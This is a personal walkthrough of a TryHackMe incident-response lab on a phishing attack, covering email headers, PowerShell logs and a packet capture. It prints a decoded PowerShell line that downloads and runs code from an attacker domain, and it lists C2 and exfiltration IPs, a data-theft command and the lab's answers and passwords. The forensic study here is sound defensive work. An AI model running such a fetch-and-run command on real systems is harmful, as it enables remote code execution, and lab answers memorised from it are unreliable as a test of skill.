https://tryhackme.com/r/room/boogeyman1

---
#### Part 1 - Email Analysis - Look at that headers!
I used Phishtool to get information about the .eml

**Q1-2**
On phishtool

**Q3**
On phishtool in `Source`, keyword `DKIM`

**Q4**
I had to rebuild the invoice.zip
I use `cat dump.eml` to see the base64 encoded attachment at the bottom.
![[Screenshot_2024-07-19_22-36-23.png]]

I put the base64 string in a file `payload` and I decoded it
```shell
cat payload | base64 -d > invoice.zip
```

I used the password from Q5 to unzip to extract `Invoice_20230103.lnk`
```shell
unzip invoice.zip
```

**Q5**
The `Invoice2023!` password is in the message of the email

**Q6**
I used `strings Invoice_20230103.lnk` to expose another base64 encoded string in
```text
aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQ  
BiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAG  
EAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==
```
Which gave me the following command
```text
iex (new-object net.webclient).downloadstring('http://files.bpakcaging.xyz/update')
```

#### Part 2 - Endpoint Security - Are you sure that’s an invoice?
**Q1**
```shell
cat powershell.json | jq '{ScriptBlockText}' | grep bpak
```
This shows up `cdn` and `files` subdomains

**Q2-4**
```shell
cat powershell.json | jq '{ScriptBlockText}' | grep ".exe"
```
This shows up 3 responses

**Q5**
```Shell
cat powershell.json | jq '{ScriptBlockText}' | sort | uniq
```
I give all the information needed for all the part 2, found it late

**Q6**
`.kdbx` is used by `keepass`

**Q7**
Bruteforce heheheheheheheheh

**Q8**
Command from Q5
#### Part 3 - Network Traffic Analysis - They got us. Call the bank immediately!

**C2 IP**
```text
159.89.205.40
```

**Exfiltration IP**
```text
167.71.211.113
```

**Q1**
```Wireshark
frame contains "files.bpakcaging.xyz"
```
Follow the TCP stream of the one with `/sq3.exe` and check the header

**Q2**
```Wireshark
http.request.method == "POST"
```

**Q3**
```Wireshark
ip.dst == 167.71.211.113
```
This clearly shows a DNS exfiltration

**Q4**
```Wireshark
frame contains "sq3.exe"
```
The frame is the `44459` with the payload
```text
.\Music\sq3.exe AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite "SELECT * from NOTE limit 100";pwd
```
I followed the HTTP stream which was the `751`th and I switched to the next (`752`) where I got a decimal encoded payload with the `%p9^3!lL^Mz47E2GaT^y` password in

**Q5**
```shell
tshark -r capture.pcapng -Y 'dns && ip.dst == 167.71.211.113 && _ws.col.info contains "0x0004"' | cut -d ' ' -f 12 | cut -d '.' -f 1 > file
```
Because the exfiltration is by DNS, I just isolated the payload into one big hex string to decode and rebuild the `protected_data.kdbx` 
Then I installed Keepass `sudo apt install keepassx` and used the password from Q4 to open it and the card number was in it. gg

The hardest I've done so far

